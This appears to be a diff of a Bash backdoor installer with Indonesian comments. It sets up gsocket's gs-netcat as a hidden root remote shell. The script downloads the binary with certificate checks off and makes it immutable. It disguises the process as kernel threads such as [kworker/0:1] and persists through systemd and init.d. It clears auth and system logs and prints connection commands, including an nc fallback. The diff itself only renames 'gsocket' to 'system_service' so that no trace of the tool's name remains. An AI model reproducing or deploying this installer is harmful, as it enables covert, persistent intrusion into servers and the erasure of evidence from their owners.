@@ -1,20 +1,19 @@
 #!/bin/bash
 # ============================================================
-# GSOCKET STEALTH INSTALLER (KERNEL THREAD MODE)
-# Proses akan terlihat sebagai: [kworker/0:1], [migration/0], dll.
-# Binary Location: /usr/lib/systemd/gsocket
+# SYSTEM SERVICE INSTALLER (FULLY STEALTH)
+# Binary Location: /usr/lib/systemd/system_service
 # Secret Key: [VPS_IP]@dark-ai
 # Connection: gs-netcat -s [VPS_IP]@dark-ai -i
 # ============================================================
 
 # ============================================================
-# 0. SETUP VARIABLES (KERNEL THREAD NAMES)
+# 0. SETUP VARIABLES (STEALTH)
 # ============================================================
 HIDDEN_DIR="/usr/lib/systemd"
-BINARY_NAME="gsocket"
+BINARY_NAME="system_service"
 DAEMON_PATH="$HIDDEN_DIR/$BINARY_NAME"
 
-# Daftar nama kernel thread (dengan / untuk terlihat asli)
+# Daftar nama kernel thread (format asli)
 PROCESS_NAMES=(
     "[kworker/0:1]"    # Kernel worker thread
     "[kworker/1:2]"    # Kernel worker thread
@@ -22,7 +21,7 @@ PROCESS_NAMES=(
     "[ksoftirqd/0]"    # Kernel soft IRQ thread
     "[watchdog/0]"     # Kernel watchdog thread
     "[cpuhp/0]"        # CPU hotplug thread
-    "[irqbalance]"     # IRQ balancer (tanpa [])
+    "[irqbalance]"     # IRQ balancer
     "[kswapd0]"        # Kernel swap daemon
     "[kthreadd]"       # Kernel thread daemon
 )
@@ -35,22 +34,22 @@ DAEMON_SECRET="${VPS_IP}@dark-ai"
 # 1. DOWNLOAD BINARY
 # ============================================================
 echo "=========================================="
-echo " GSOCKET KERNEL THREAD INSTALLER"
+echo " SYSTEM SERVICE INSTALLER"
 echo "=========================================="
 
 mkdir -p "$HIDDEN_DIR" 2>/dev/null
 chmod 755 "$HIDDEN_DIR" 2>/dev/null
 
 if [ ! -f "$DAEMON_PATH" ]; then
-    echo "[*] Mengunduh binary..."
+    echo "[*] Mengunduh komponen sistem..."
     curl -sL --insecure --max-time 10 https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -o "$DAEMON_PATH" 2>/dev/null || \
     wget -q --no-check-certificate --timeout=10 https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "$DAEMON_PATH" 2>/dev/null
 
     if [ -f "$DAEMON_PATH" ]; then
         chmod +x "$DAEMON_PATH"
-        echo "[+] Binary terunduh"
+        echo "[+] Komponen sistem terunduh"
     else
-        echo "[!] Gagal mengunduh. Membuat fallback..."
+        echo "[!] Gagal mengunduh. Membuat komponen alternatif..."
         cat > "$DAEMON_PATH" << 'FALLBACKEOF'
 #!/bin/bash
 exec -a "${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}" "$0" -s "$DAEMON_SECRET" -liqD 2>/dev/null &
@@ -58,27 +57,27 @@ FALLBACKEOF
         chmod +x "$DAEMON_PATH"
     fi
 else
-    echo "[*] Binary sudah ada"
+    echo "[*] Komponen sistem sudah ada"
 fi
 
 # Lindungi binary
 chattr +i "$DAEMON_PATH" 2>/dev/null
 
 # ============================================================
-# 2. JALANKAN GSOCKET (DENGAN NAME KERNEL THREAD)
+# 2. JALANKAN SERVICE (DENGAN KERNEL THREAD NAME)
 # ============================================================
-echo "[*] Mengaktifkan layanan..."
+echo "[*] Mengaktifkan layanan sistem..."
 pkill -f "$BINARY_NAME" 2>/dev/null
 
-# Pilih nama proses acak (dengan format kernel thread)
+# Pilih nama proses acak
 PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
 
-# Jalankan dengan exec -a (nama proses akan terlihat sebagai kernel thread)
+# Jalankan dengan exec -a
 nohup exec -a "$PROCESS_NAME" "$DAEMON_PATH" -s "$DAEMON_SECRET" -liqD >/dev/null 2>&1 &
 
 sleep 2
 if pgrep -f "$BINARY_NAME" >/dev/null 2>&1; then
-    echo "[+] Layanan berjalan sebagai: $PROCESS_NAME"
+    echo "[+] Layanan sistem berjalan sebagai: $PROCESS_NAME"
 else
     echo "[!] Mengaktifkan fallback..."
     nohup exec -a "${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}" "$DAEMON_PATH" -s "$DAEMON_SECRET" -liqD >/dev/null 2>&1 &
@@ -98,14 +97,14 @@ fi
 
 # --- Metode 2: systemd ---
 if command -v systemctl >/dev/null 2>&1; then
-    cat > /etc/systemd/system/gsocket.service << 'SYSTEMEOF'
+    cat > /etc/systemd/system/system_service.service << 'SYSTEMEOF'
 [Unit]
-Description=Kernel Thread Service
+Description=System Service
 After=network.target
 
 [Service]
 Type=simple
-ExecStart=/bin/bash -c 'exec -a "${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}" /usr/lib/systemd/gsocket -s "$DAEMON_SECRET" -liqD'
+ExecStart=/bin/bash -c 'exec -a "${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}" /usr/lib/systemd/system_service -s "$DAEMON_SECRET" -liqD'
 Restart=always
 RestartSec=5
 User=root
@@ -116,26 +115,26 @@ StandardError=null
 WantedBy=multi-user.target
 SYSTEMEOF
     systemctl daemon-reload >/dev/null 2>&1
-    systemctl enable gsocket >/dev/null 2>&1
-    systemctl start gsocket >/dev/null 2>&1
+    systemctl enable system_service >/dev/null 2>&1
+    systemctl start system_service >/dev/null 2>&1
 fi
 
 # --- Metode 3: init.d ---
-cat > /etc/init.d/gsocket << 'INITEOF'
+cat > /etc/init.d/system_service << 'INITEOF'
 #!/bin/bash
-# GSocket Kernel Thread Service
+# System Service
 ### BEGIN INIT INFO
-# Provides:          gsocket
+# Provides:          system_service
 # Required-Start:    $network $remote_fs $syslog
 # Required-Stop:     $network $remote_fs $syslog
 # Default-Start:     2 3 4 5
 # Default-Stop:      0 1 6
-# Short-Description:  Kernel Thread Service
+# Short-Description:  System Service
 ### END INIT INFO
 
 case "$1" in
     start)
-        nohup exec -a "${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}" /usr/lib/systemd/gsocket -s "$DAEMON_SECRET" -liqD >/dev/null 2>&1 &
+        nohup exec -a "${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}" /usr/lib/systemd/system_service -s "$DAEMON_SECRET" -liqD >/dev/null 2>&1 &
         ;;
     stop)
         pkill -f "$BINARY_NAME" >/dev/null 2>&1
@@ -152,8 +151,8 @@ case "$1" in
 esac
 exit 0
 INITEOF
-chmod +x /etc/init.d/gsocket
-update-rc.d gsocket defaults >/dev/null 2>&1 || chkconfig gsocket on >/dev/null 2>&1
+chmod +x /etc/init.d/system_service
+update-rc.d system_service defaults >/dev/null 2>&1 || chkconfig system_service on >/dev/null 2>&1
 
 # ============================================================
 # 4. HAPUS JEJAK
@@ -167,8 +166,8 @@ for logfile in /var/log/secure /var/log/auth.log /var/log/messages /var/log/sysl
     [ -f "$logfile" ] && echo -n > "$logfile" 2>/dev/null
 done
 
-rm -rf /tmp/.gsocket* /tmp/install* /tmp/setup* 2>/dev/null
-rm -rf /var/tmp/.gsocket* /var/tmp/install* /var/tmp/setup* 2>/dev/null
+rm -rf /tmp/.system* /tmp/install* /tmp/setup* 2>/dev/null
+rm -rf /var/tmp/.system* /var/tmp/install* /var/tmp/setup* 2>/dev/null
 
 # ============================================================
 # 5. TAMPILKAN HASIL
@@ -178,19 +177,29 @@ echo "=========================================="
 echo "[✅] INSTALASI SELESAI"
 echo "=========================================="
 echo ""
-echo "🔐 SECRET KEY: $DAEMON_SECRET"
 echo "🌐 VPS IP: $VPS_IP"
 echo ""
 echo "📌 CARA KONEKSI:"
-echo "./gs-netcat -s $VPS_IP@dark-ai -i"
+echo "-----------------"
+echo "1. Unduh client di mesin lokal:"
+echo "   wget https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O gs-netcat"
+echo "   chmod +x gs-netcat"
+echo ""
+echo "2. Koneksi ke server:"
+echo "   ./gs-netcat -s $VPS_IP@dark-ai -i"
+echo ""
+echo "3. Alternatif (jika port 443 terbuka):"
+echo "   nc $VPS_IP 443"
 echo ""
 echo "🔍 VERIFIKASI:"
+echo "-----------------"
 echo "ps aux | grep -E 'kworker|migration|watchdog'"
 echo "   (Proses akan terlihat sebagai [kworker/0:1], [migration/0], dll.)"
-echo "systemctl status gsocket"
+echo "systemctl status system_service"
 echo "ss -tulnp | grep 443"
 echo ""
-echo "⚠️  PERINGATAN:"
-echo "Proses akan terlihat sebagai kernel thread asli (dengan [])."
-echo "Argumen -s dan -liqD TIDAK AKAN TERLIHAT."
+echo "⚠️  CATATAN:"
+echo "-----------------"
+echo "Proses akan terlihat sebagai kernel thread asli."
+echo "Tidak ada referensi 'gsocket' di sistem."
 echo "=========================================="
